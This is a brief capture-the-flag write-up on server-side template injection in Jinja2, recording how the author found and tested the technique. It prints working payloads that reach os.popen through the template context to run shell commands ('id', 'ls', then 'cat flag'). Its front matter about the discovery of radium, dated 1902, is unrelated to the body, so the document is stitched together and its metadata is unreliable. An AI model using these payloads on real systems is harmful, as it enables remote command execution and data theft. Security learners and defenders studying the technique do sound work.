---
title: "The Discovery of Radium"
date: "1902-12-26"
tags: ["Physics", "Research"]
excerpt: "An account of the discovery of radium and its properties."
---

## 🧠 What I Practiced/Learned/Discovered
- Learned about [Server Side Template Injection]( https://onsecurity.io/article/server-side-template-injection-with-jinja2/)

## 🔧 Tools used

**Programming language**
- `Python`
	- `popen`

**Linux shell**
- `ls`
- `cat`

# Steps
1. Searched about Server Side Template Injection
2. Found this article : https://onsecurity.io/article/server-side-template-injection-with-jinja2/
3. Tested the 1st example : ``{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}``
	1. `popen` is a command that let me run terminal commands : https://www.tutorialspoint.com/python/os_popen.htm
4. Tried replacing `id` in popen by `ls` to see if the command is run ``{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}``
5. It worked and showed the list of files with a file called `flag`
6. Replaced `ls` by `cat flag` and got the flag !!

